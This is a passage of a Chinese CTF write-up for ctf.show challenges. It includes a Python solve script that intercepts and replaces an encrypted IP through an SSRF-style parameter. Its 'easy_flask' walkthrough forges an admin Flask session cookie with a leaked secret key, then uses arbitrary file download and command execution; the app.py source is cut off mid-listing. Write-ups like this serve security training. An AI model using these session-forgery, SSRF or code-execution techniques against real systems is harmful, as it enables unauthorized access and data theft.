537fc6419bf577bdbda4e4c8e8877d60f710f3182ca0649518de119ade1f3364400b742b886ccb9369c839d9a2df82a40eebae502c9f19c936df0a79b68b555fa578af472946b7f820ced3beb74d0e329479ec87e7845c9f13d5474f6f04023860c9d05c21d528ff4d8874a59900e743560aa7926d65b9b1ff83d1a817fdd10aa24f390b02d9c1f745752f87081034be140516217b60433197adaf60f7eda650c08802ff8fc27322dbb72bb19086aef2adb63ba29c0ed913822014a361845aa2fe1cb5a30f9ba1f2a24c01f7dca3099ce12cd15e586a86c8f286339aa4dcf022726fad15639562059ae118744bb81310d9dcba153eed0f918f58077b449be60ee18c9cee868c23c396c9f66b2064bfc7114c4eab207bf2f6536ba0fd05435cb861db39278a8b46dc4673d432592c9c153840c94d3d3ef867d76977065597f700b7e1c70654939769efbc5f263b9d0ad9dd1835945948ed09ab40c6e28c9a089d6a8152a929b7142e0a4eef38518185f7fd4556d40d8a9c16b135c1dd941703a6c9384a88ec2c1835ca1d895be51b2ed1a8f675d6cb88ef9a4a7ae981725a9af09b73603f0c4342119668c79df73d68dc4eb157223d8193e85f9917c1c6f378cdc7b042eb18588faacdea994ec599f138fb74fd53494bf6e5d34a5949be6f750dd87e8a854b25a6969b1021eb3e81d6c74be02d95789bdca6fde4bc29d345d42e3e124981f0ea221e4601e95c72b44a6b078eb9e3fcd098f903617b69cab1110615701965a901d9197563595157bfc17e280b8b1e0edc7d3d424d52e6e55f8d44dff6c1685c349bebb6a976fd29658877ed409584ad2c75e9dda60de23607c32e633bd1f20e60f6dd70a8c1045686b1745d4e212c99e31d08bdc5f45550439357b73d20fdf9e92
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2payload‰∏ÄÊääÊ¢≠ËÑöÊú¨">2.payloadÔºö‰∏ÄÊääÊ¢≠ËÑöÊú¨</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">abort</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://2c5da381-d8ac-4d1b-8918-dc3ebde25791.challenge.ctf.show/&#39;</span>  <span class="c1"># È¢òÁõÆURLÔºåÂÖàÁ≠âÂá†ÁßíÂÜçËøêË°å</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Âä†ÂØÜ</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">public_key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">+=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ciphertext</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_plaintext_half</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/update&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;[^@]*\.92&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_public_key</span><span class="p">(</span><span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/shop?a # Ëé∑ÂèñËß£ÂØÜÂêéÁöÑÊï∞ÊçÆpi=127.0.0.1:9999&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">.*</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY-----&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)[</span>
</span></span><span class="line"><span class="cl">        <span class="n">public_key</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s1">&#39;2.56.12.89&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half</span> <span class="o">=</span> <span class="n">get_plaintext_half</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Ëé∑ÂèñÂÖ¨Èí•2„ÄÅ3</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key2</span> <span class="o">=</span> <span class="n">get_public_key</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-----BEGIN PUBLIC KEY-----&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                          <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;-----END PUBLIC KEY-----&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY-----&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key3</span> <span class="o">=</span> <span class="n">get_public_key</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;-----BEGIN PUBLIC KEY-----&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                          <span class="s1">&#39;-----BEGIN PUBLIC KEY-----</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;-----END PUBLIC KEY-----&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">-----END PUBLIC KEY-----&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ‰∏§Ê¨°Âä†ÂØÜ</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">public_key3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">IP_ciphertext</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">IP_ciphertext</span><span class="p">,</span> <span class="n">public_key2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ÊõøÊç¢ÊúÄÁªàIP</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext_half_new</span> <span class="o">=</span> <span class="n">plaintext_half</span><span class="p">[:</span><span class="mi">2048</span><span class="p">]</span> <span class="o">+</span> <span class="n">IP_ciphertext</span> <span class="o">+</span> <span class="n">plaintext_half</span><span class="p">[</span><span class="mi">4096</span><span class="p">:]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ËØ∑Ê±Ç</span>
</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/pass_message&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="n">plaintext_half_new</span><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Êé•Êî∂ÊòéÊñá</span>
</span></span><span class="line"><span class="cl"><span class="n">text</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/update&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;ctfshow{.*}&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">input</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easy_flask">easy_flask</h2>
<h4 id="flaskÁöÑsession‰º™ÈÄ†‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩpythonÂëΩ‰ª§ÊâßË°å">flaskÁöÑsession‰º™ÈÄ†+‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ+pythonÂëΩ‰ª§ÊâßË°å</h4>
<h4 id="1ÂÅöÈ¢òÊÄùË∑Ø-4">1.ÂÅöÈ¢òÊÄùË∑Ø</h4>
<h5 id="1ÂÖàÂéªÊ≥®ÂÜåÁî®Êà∑ÂêçËæìÂÖ•adminËøîÂõûaccount-already-existsËØ¥ÊòéÂ≠òÂú®adminÁî®Êà∑‰ΩÜÊòØËøôÈ¢òÊòéÊòæ‰∏çÊòØËÆ©‰Ω†ÁàÜÁ†¥ÂØÜÁ†Å">1.ÂÖàÂéªÊ≥®ÂÜåÔºåÁî®Êà∑ÂêçËæìÂÖ•adminÔºåËøîÂõûAccount already exists!ÔºåËØ¥ÊòéÂ≠òÂú®adminÁî®Êà∑Ôºå‰ΩÜÊòØËøôÈ¢òÊòéÊòæ‰∏çÊòØËÆ©‰Ω†ÁàÜÁ†¥ÂØÜÁ†Å</h5>
<h5 id="2Ê≥®ÂÜåÊñ∞Áî®Êà∑ÁÑ∂ÂêéËøîÂõûÁôªÂΩï">2.Ê≥®ÂÜåÊñ∞Áî®Êà∑ÔºåÁÑ∂ÂêéËøîÂõûÁôªÂΩï„ÄÇ</h5>
<h5 id="3ÁôªÂΩïÈ°µÈù¢ÂèëÁé∞‰∏Ä‰∏™learnÈìæÊé•‰ΩÜÊòØ‰∏ãÈù¢‰πüÊúâÊèêÁ§∫Êüê‰∫õÂäüËÉΩÂè™ÂØπadminÂºÄÊîæÁÇπËøõlearnÈìæÊé•ÁúãÁúã">3.ÁôªÂΩïÈ°µÈù¢ÔºåÂèëÁé∞‰∏Ä‰∏™learnÈìæÊé•Ôºå‰ΩÜÊòØ‰∏ãÈù¢‰πüÊúâÊèêÁ§∫ÔºåÊüê‰∫õÂäüËÉΩÂè™ÂØπadminÂºÄÊîæ„ÄÇÁÇπËøõlearnÈìæÊé•ÁúãÁúã</h5>
<p>ÈÄöËøálearnÈ°µÈù¢ÔºåÂèëÁé∞‰∫ÜsessionÁöÑÂØÜÈí•ÔºåÂèØ‰ª•Â∞ùËØïËøõË°åsession‰º™ÈÄ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">app.secret_key = &#39;S3cr3tK3y&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖ≥ÈîÆ‰ª£Á†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="s1">&#39;username&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="p">[</span><span class="s1">&#39;loggedin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;Incorrect username/password!&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;login.html&#39;</span><span class="p">,</span> <span class="n">msg</span><span class="o">=</span><span class="n">msg</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="4ËøõË°åsession‰º™ÈÄ†">4.ËøõË°åsession‰º™ÈÄ†</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 flask_session_cookie_manager3.py encode -s &#39;S3cr3tK3y&#39; -t &#34;{&#39;loggedin&#39;: True, &#39;role&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">.eJyrVsrJT09PTcnMU7IqKSpN1VEqys9JVbJSSkzJBYrpKJUWpxblJeYihGoBzOYRgA.ZDKUZA.VrSPdJ2nKesTJFDJucQqPXODP0M
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="5ÊäìÂåÖ‰øÆÊîπcookieÁöÑsessionÂÄºÊîπ‰∏∫ÂàöÊâç‰º™ÈÄ†ÁöÑÂÄºÁÑ∂ÂêéËøîÂõûÈ°µÈù¢">5.ÊäìÂåÖÔºå‰øÆÊîπcookieÁöÑsessionÂÄºÔºåÊîπ‰∏∫ÂàöÊâç‰º™ÈÄ†ÁöÑÂÄºÔºåÁÑ∂ÂêéËøîÂõûÈ°µÈù¢</h5>
<h5 id="6‰∏ãËΩΩÊñá‰ª∂ÂèëÁé∞ÊòØ‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ÂÜÖÂÆπ‰∏∫flagfake_flag">6.‰∏ãËΩΩÊñá‰ª∂ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™ÊñáÊú¨Êñá‰ª∂ÔºåÂÜÖÂÆπ‰∏∫flag{fake_flag}</h5>
<p>Ëøô‰∏™Êó∂ÂÄôÊäìÂåÖÁúã‰∏Ä‰∏ãÔºåÂèëÁé∞Êñá‰ª∂Âêç‰∏∫fakeflag.txtÔºåÊòéÊòæÊòØÊÑö‰∫∫ËäÇÊÑö‰∫∫Âï¶</p>
<p>Âè™ËÉΩÂÜçÊÉ≥ÊÉ≥ËøòÊúâÊ≤°ÊúâÂøΩÁï•ÁöÑÁÇπÔºåÂèàÂéªÁúã‰∫ÜlearnÈìæÊé•ÁöÑ‰ª£Á†ÅÔºåÂèëÁé∞‰∫ÜË¢´Ê≥®ÈáäÁöÑapp.py</p>
<h5 id="7‰∏ãËΩΩapppyÂæóÂà∞Ê∫êÁ†ÅÂèëÁé∞ÂÖ≥ÈîÆ‰ª£Á†Å">7.‰∏ãËΩΩapp.pyÔºåÂæóÂà∞Ê∫êÁ†ÅÔºåÂèëÁé∞ÂÖ≥ÈîÆ‰ª£Á†Å</h5>
<p><img src="/images/easy_flask.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>ÈúÄË¶Åget‰º†ÂèÇÔºå‰ΩÜÊòØÂõ†‰∏∫Ê∫ê‰ª£Á†ÅÊ≤°ÊúâË∞ÉÁî®osÂ∫ìÔºåÈúÄË¶ÅpayloadÂä†‰∏Ä‰∏ãÔºå‰º†ÂèÇ‰πãÂêéÂæóÂà∞flag</p>
<p>ËøôÈáåË¥¥‰∏Ä‰∏ãapp.pyÊ∫êÁ†Å~</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span><span class="lnt">90
</span><span class="lnt">91
</span><span class="lnt">92
</span><span class="lnt">93
</span><span class="lnt">94
</span><span class="lnt">95
</span><span class="lnt">96
</span><span class="lnt">97
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># app.py</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">send_file</span><span class="p">,</span> <span class="n">Response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;S3cr3tK3y&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;admin&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="s1">&#39;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#39;</span><span class="p">,</span> <span class="s1">&#39;role&#39;</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Check if user is loggedin</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;loggedin&#39;</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login/&#39;</span><span class="p">,</span> <span class="n">methods</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span> <span class="ow">and</span> <span class="s1">&#39;username&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span> <span class="ow">and</span> <span class="s1">&#39;password&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">password</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">][</span><span class="s1">&#39;password&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;loggedin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
